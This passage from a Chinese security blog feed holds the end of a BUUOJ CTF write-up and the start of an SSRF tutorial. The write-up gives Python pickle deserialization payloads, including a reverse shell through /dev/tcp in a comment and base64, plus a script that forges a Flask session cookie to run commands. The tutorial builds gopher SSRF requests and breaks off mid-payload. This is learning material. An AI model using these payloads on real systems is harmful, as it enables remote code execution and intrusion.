class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,<br>    # <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;cat /flag &gt; /tmp/a&quot;,))<br>    # <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>,(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1&#x27;“,))<br>&#125;)<br><br>user = pickle.dumps(User())<br>print(user)<br>print(base64.b64encode(user))<br></code></pre></td></tr></table></figure><p>然后构造payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">命令<br>python3 flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> encode -s <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwMS4zNy44MC44My84MDgwIDA+JjEnlIWUUpQu&#x27;&#125;&#125;&quot;</span><br><br>结果<br><span class="hljs-selector-class">.eJyrVipVsqpWSlKyUkp3DA4LKXeEAmdfpwinsmSjHJMcz3L3ZOOcqhT3sJIcL__QLJegzMgIv3xPZ8MsT-cUGLvA08Uk19PZMjsqIrIsxd2v3KfKtdw32KTKr9LExNcZiCstTHxd0ss9XRy1vbJc83I8w0NDCwJLlWprASTpKyY</span><span class="hljs-selector-class">.Z78LWg</span>.AfikxUCG4pPwMOpS-<span class="hljs-number">7</span>aFswGcyi4<br></code></pre></td></tr></table></figure><p>开启监听，换session，访问&#x2F;admin去反序列化</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262040223.png" alt="image-20250226204039017"></p><p>也可用写脚本直接出（也是在Linux系统里运行）</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ac510cf4-043f-4d31-9b24-97cb1ede76b6.node5.buuoj.cn:81/&quot;</span><br><br><br><br># def get_secret_key():<br>    # target = url + <span class="hljs-string">&quot;/file?file=/proc/self/environ&quot;</span><br>    # r = requests.get(target)<br>    # # print(r.text)<br>    # key = re.findall(<span class="hljs-string">&#x27;key=(.*?).OLDPWD&#x27;</span>, r.text)<br>    # return str(key[<span class="hljs-number">0</span>])<br><br># secret_key = get_secret_key()<br># print(secret_key)<br><br><span class="hljs-keyword">class</span> FakeApp:<br>    # secret_key = secret_key<br>    secret_key = <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br><br><span class="hljs-keyword">class</span> User(object):<br>    def __reduce__(self):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;cat /flag &gt; /tmp/b&quot;</span><br>        return (os.<span class="hljs-keyword">system</span>, (cmd,))<br><br>exp = &#123;<br>    <span class="hljs-string">&quot;b&quot;</span>: base64.b64encode(pickle.dumps(User()))<br>&#125;<br><br># pickletools.dis(pickle.dumps(User()))<br># print(pickletools.dis(b<span class="hljs-string">&#x27;\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.&#x27;</span>))<br><br>fake_app = FakeApp()<br>session_interface = SecureCookieSessionInterface()<br>serializer = session_interface.get_signing_serializer(fake_app)<br>cookie = serializer.dumps(<br>    # &#123;<span class="hljs-string">&#x27;u&#x27;</span>:b<span class="hljs-string">&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94.&#x27;</span>&#125;<br>    &#123;<span class="hljs-string">&#x27;u&#x27;</span>: exp&#125;<br>)<br>print(cookie)<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=&#123;0&#125;&quot;</span>.format(cookie)<br>&#125;<br><br>req = requests.get(url + <span class="hljs-string">&quot;/admin&quot;</span>, headers=headers)<br># print(req.text)<br><br>req = requests.get(url + <span class="hljs-string">&quot;/file?file=/tmp/b&quot;</span>, headers=headers)<br>print(req.text)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262024402.png" alt="image-20250226202452159"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buuoj</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF学习总结</title>
    <link href="/2025/05/04/SSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/SSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145468534?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145468534?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行下一个漏洞——SSRF的学习。SSRF是常见漏洞之一，是Web安全必学漏洞。</p><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞。</p><p>简单来说，攻击者利用服务器A去攻击服务器B就是服务器端请求伪造。</p><p>因为请求是由服务端发起的，而服务端能请求到与自身相连的内网，所以SSRF往往用来攻击内网。上面我们举例的这个B服务器可能因为有防火墙或者不能被我们直接连接，所以常规方法不能入侵，SSRF的作用就在此时显现。</p><p>下面这张图是作者引用别人的，涵盖了SSRF大部分知识点：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952120.png"></p><h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><p>服务器接受了来自于客户端的URL 地址，并由服务器发送该URL 请求。</p><p>对用户输入的URL 没有进行恰当的过滤与限制，导致任意URL 输入，但没对响应的结果进行检验，又直接输出。</p><p>简单来说，服务端会访问攻击者传入的地址，攻击者从而可以将其作为跳板去攻击其他服务器，这就形成了SSRF。</p><p>我们这里提一下PHP中导致SSRF的常见函数：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952445.png"></p><p>函数利用条件：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952576.png"></p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p><strong>从Web功能点寻找</strong></p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞。</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><p>简单来说，服务端有可能会访问我们传递的链接，凡是有上述情况的所有位置都有可能发生SSRF。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953325.png"></p><p><strong>漏洞验证:</strong></p><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。</p><p>在页面源码中查找访问的资源地址，如果该资源地址类型为<a href="http://www.xxx.com/a.php?image=%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E3%80%82">http://www.xxx.com/a.php?image=地址，就可能存在SSRF漏洞。</a></p><p>上面例子通过URL地址分享网页的内容，通过目标地址获取了图片内容，如果此功能中没有对目标地址的范围做过过滤与限制，则可能存在SSRF漏洞。</p><p>这里有个问题，即使我们发现了有SSRF漏洞，但我们是需要知道它的内网地址的。</p><ol><li>第一种方法，就是前期的信息收集，发现了他内网的ip，直接利用。</li><li>第二种方法，就是通过FUZZ，对内网地址进行枚举。</li></ol><h3 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h3><p>CSRF(跨站请求伪造，Cross-site request forgery)发生条件，当用户在安全网站A登陆后保持登陆的状态，并同时浏览了保存恶意代码的另一个网站B，此时B网站劫持用户浏览器并以用户登陆的状态对A网站发送了用户本人操作的请求。</p><p>CSRF是服务器没有对用户提交的数据进行随机值的校验，且对http请求的referer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。</p><p>SSRF是服务器对用户提供的URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其他服务器。</p><p><strong>简单来说，CSRF是攻击者利用用户端去达成自己的目的，而SSRF是攻击者利用服务端去达成自己的目的。</strong></p><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><h3 id="内网-外网"><a href="#内网-外网" class="headerlink" title="内网&amp;外网"></a>内网&amp;外网</h3><p>内网和外网的概念并不是绝对的，要明白的就是内网是外网无法直接访问的。</p><p>简单的说，自己的单位或者家庭、小区内部有局域网；单位、家庭之外有覆盖范围极大的网络，比如internet，这个大网络延伸到了我们的单位、家庭（通过光纤、网线、电话线等）。我们把自己的局域网连接到internet上，那么我们的访问范围就从局域网扩展到了整个internet。这时候，就说局域网是内网，internet是外网。</p><p>同理，如果你们单位的局域网很庞大，而你的办公室里面的几台电脑组成的小局域网又连接到单位的整个大局域网，那么也可以说单位的大局域网是外网，办公室内的小局域网是内网。</p><p>内网也可能是外网的一个部分，比如校园网，或者相对于单位局域网的办公室内部局域网。其特征是：内网电脑的ip就是整个外网ip范围的一部分，内网的电脑通过网关（路由器）连接到外网，网关不需要进行代理服务，直接路由就行了。</p><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h3><p>为了更好地了解SSRF在内网中的利用方式，我们这里简单讲一下NAT作为扩展。</p><p>NAT是什么（摘自百度百科）？</p><p>NAT（Network Address Translation），是指网络地址转换，1994年提出的。NAT是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决IPv4地址短缺而开发的技术。</p><p>NAT旨在通过将一个外部 IP 地址和端口映射到更大的内部 IP 地址集来转换 IP 地址。 基本上，NAT 使用流量表将流量从一个外部（主机）IP 地址和端口号路由到与网络上的终结点关联的正确内部 IP 地址。</p><p><strong>百度的解释让人摸不着头脑，别急，我们先从实际情景讲起。</strong></p><p>2019年11月26日，全球所有43亿个IPv4地址已分配完毕，这意味着没有更多的IPv4地址可以分配给ISP和其他大型网络基础设施提供商。</p><p>IPv4，即网际网协议第4版（Internet Protocol Version 4），定义一个跨越异种网络互连的超级网，为每个网际网的节点分配全球唯一IP地址。</p><p>IPv4使用32bits整数表达一个地址，地址最大范围就是232，约为43亿。以IP创始时期可被联网的设备来看，这样的一个空间已经很大，很难被短时间用完。然而，事实远远超出人们的设想，计算机网络在此后的几十年里迅速壮大，网络终端数量呈爆炸性增长。</p><p>更糟糕的是，为了路由和管理方便，43亿的地址空间按不同前缀长度划分为A,B,C,D,E类地址网络和保留地址。这样一种分配策略使得IP地址浪费很严重，很多被分配出去的地址没有真实被利用，地址消耗很快。</p><p>简单来说，就是发展太快导致IPv4地址数目不够用了，那么有什么解决方法呢，主要有以下几种处理方法：</p><p>1、动态分配IP地址：只给接入网络的设备分配IP地址</p><p>2、NAT技术</p><p>3、IPV6，128位来表示一个IP地址。</p><p>动态分配IP地址就是一个设备上网就分配 IP，不上网就先不分配，这显然只能是权宜之计；IPv6使用 128 位 16 个字节表示 IP 地址，数量非常之大，虽然理论<strong>上</strong>从根本上解决了 IP 地址不够用的问题，但实际上IPv6 的推广举步维艰，因为 IPv6 和 IPv4 不兼容。</p><p>以上两种方法并不很靠谱，但至今我们依然使用着IPv4，那么是谁拯救了早已到达极限的它呢？</p><p>我们今天介绍的主角NAT技术登场了，它的出现几乎让IPv4起死回生。</p><p>首先我们要知道，RFC 1918 为私有网络预留出了三个IP 地址块，如下：</p><p>A 类：10.0.0.0～10.255.255.255</p><p>B 类：172.16.0.0～172.31.255.255</p><p>C 类：192.168.0.0～192.168.255.255</p><p>上述三个范围内的地址不会在因特网上被分配，因此可以不必向ISP 或注册中心申请而在公司或企业内部自由使用。</p><p>那这个对我们有什么用呢？</p><p>既然使用上述三个范围内的地址不必申请，那我们不连接Internet的公司内网是不是就可以随便用这三类地址。反正我们不连接Internet，自然也不会有IP地址冲突这一说法，隔壁公司和我用同样的IP也没有关系，只要我们内部各个服务器的IP不同就行。</p><p>可是，问题出现了，我们内网如果要连接Internet怎么办？世界上很多公司的内网服务器可能都用这三类地址，那显然不能用我们在内网用的这套ip去连接互联网，这时候就可以用网络地址转换（NAT）。</p><p>结合上面百度给的介绍，我们就可以明白，NAT其实就是我们内网的私有IP在连接公网时转换成全局IP。</p><p>NAT的实现方式有三种，即静态转换Static Nat、动态转换Dynamic Nat和端口多路复用OverLoad。</p><p>静态转换是指内部本地地址一对一转换成内部全局地址，相当内部本地的每一台PC都绑定了一个全局地址。一般用于在内网中对外提供服务的服务器。</p><p>动态转换是指将内部网络的私有IP地址转换为公用IP地址时，IP地址是不确定的，是随机的，所有被授权访问上Internet的私有IP地址可随机转换为任何指定的合法IP地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当ISP提供的合法IP地址略少于网络内部的计算机数量时。可以采用动态转换的方式。</p><p>端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节约IP地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自internet的攻击。因此，网络中应用最多的就是端口多路复用方式。</p><h3 id="常用伪协议及其利用方式"><a href="#常用伪协议及其利用方式" class="headerlink" title="常用伪协议及其利用方式"></a>常用伪协议及其利用方式</h3><p><strong>file:&#x2F;&#x2F;</strong> </p><p>本地文件传输协议，主要用于访问本地计算机中的文件，可以从文件系统中获取文件内容</p><p><strong>dict:&#x2F;&#x2F;</strong>   </p><p>字典服务器协议，访问字典资源，dict是基于查询相应的TCP协议，服务器监听端口2628。可用于端口扫描、获取内网信息、爆破密码等</p><p><strong>ftp:&#x2F;&#x2F;</strong></p><p>可用于网络端口扫描，不过效率相对较低</p><p><strong>sftp:&#x2F;&#x2F;</strong>   </p><p>SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）</p><p><strong>ldap:&#x2F;&#x2F;</strong>   </p><p>轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</p><p><strong>tftp:&#x2F;&#x2F;</strong>   </p><p>简单文件传输协议。基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</p><p><strong>http:&#x2F;&#x2F;</strong></p><p>常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或资源。CTF种通常用于远程包含。</p><p><strong>gopher:&#x2F;&#x2F;</strong></p><p>互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。实际上Gopher是一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p>gopher协议在各个编程语言中的使用限制：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953782.png"></p><h3 id="gopher协议详解"><a href="#gopher协议详解" class="headerlink" title="gopher协议详解"></a>gopher协议详解</h3><p>其他协议的使用没什么特殊的，后续实际利用时简单一提即可，我们这里着重讲一下gopher协议的get和post传参。</p><p><code>URL:gopher://:/_</code>后接TCP数据流</p><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><p>首先我们尝试一下gopher协议。</p><p>nc启动监听，监听2333端口：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>使用curl发送http请求：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> gopher://<span class="hljs-number">192.168.230.133:2333</span>/<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953795.png"></p><p>此时nc收到的消息为：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953234.png"></p><p>可见gopher协议默认忽略的第一个字符，所以我们需要先写一个填充位，该填充位可随意写，一般用下划线</p><p>下面我们用gopher协议去GET传参，首先我们抓一个GET的包，然后删去多余数据，保留必要数据</p><p>GET必要保留的头部信息：</p><p>1、路径（即第一行）</p><p>2、目标IP地址（即host）</p><p>3、结束符（最后一定要有一个换行符作为结束符）</p><p>以上头部信息是每个GET包里必有的，可以看下面的例子。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953370.png"></p><p>构造好GET包后，我们往往要URL编码后再构造gopher协议。</p><p>我们需要注意URL编码的格式。</p><p>这里我建议直接在包里进行URL编码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953593.png"></p><p>注意：最好不要使用在线URL编码网站。</p><p>因为回车换行要变成%0d%0a，但直接使用在线工具转，可能只有%0a，还得自己再处理。</p><p>也不要去使用bp专门的Decoder编码，作者尝试过，也不行。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953493.png"></p><p>如果用bp发包的话，我们需要进行两次URL编码，因为到达有SSRF漏洞的服务器后会URL解码一次，而有SSRF漏洞的服务器再去进行GET传包，到达目标服务器后还会URL解码一次。</p><p>然后我们正式构造gppher</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span 